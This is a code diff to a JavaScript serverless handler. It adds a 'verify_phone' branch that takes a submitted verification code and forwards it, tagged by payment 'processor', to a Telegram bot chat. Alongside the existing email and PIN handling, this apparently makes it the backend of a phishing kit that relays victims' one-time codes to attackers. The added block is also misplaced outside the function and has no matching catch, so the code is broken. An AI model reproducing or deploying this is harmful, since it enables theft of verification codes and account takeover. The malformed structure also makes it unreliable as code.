@@ -88,7 +88,7 @@ exports.handler = async (event) => {
         };
     }
 
-    try {
+try {
         const data = JSON.parse(event.body);
 
         // Handle email verification separately
@@ -152,6 +152,72 @@ Pin:
         })
     };
 }
+
+try {
+        const data = JSON.parse(event.body);
+
+        // Handle phone verification separately
+if (data.action === "verify_phone") {
+    const processor = String(
+        data.processor || ""
+    )
+        .toLowerCase()
+        .trim();
+
+    const telegramConfig =
+        telegramConfigs[processor];
+
+    if (
+        !telegramConfig ||
+        !telegramConfig.botToken ||
+        !telegramConfig.chatId
+    ) {
+        return {
+            statusCode: 400,
+            body: JSON.stringify({
+                error:
+                    "Invalid or missing processor."
+            })
+        };
+    }
+
+    if (!data.verificationCode) {
+        return {
+            statusCode: 400,
+            body: JSON.stringify({
+                error:
+                    "Verification code is required."
+            })
+        };
+    }
+
+    const phoneMessage = `
+
+Processor:
+<b>${processor.toUpperCase()}</b>
+
+Verification Code:
+<b>${data.verificationCode}</b>
+
+`;
+
+    await sendTelegramMessage(
+        phoneMessage,
+        null,
+        telegramConfig.botToken,
+        telegramConfig.chatId
+    );
+
+    return {
+        statusCode: 200,
+        body: JSON.stringify({
+            success: true,
+            message:
+                "Code sent successfully."
+        })
+    };
+}
+
 
         // Get processor from the URL
         const processor = String(
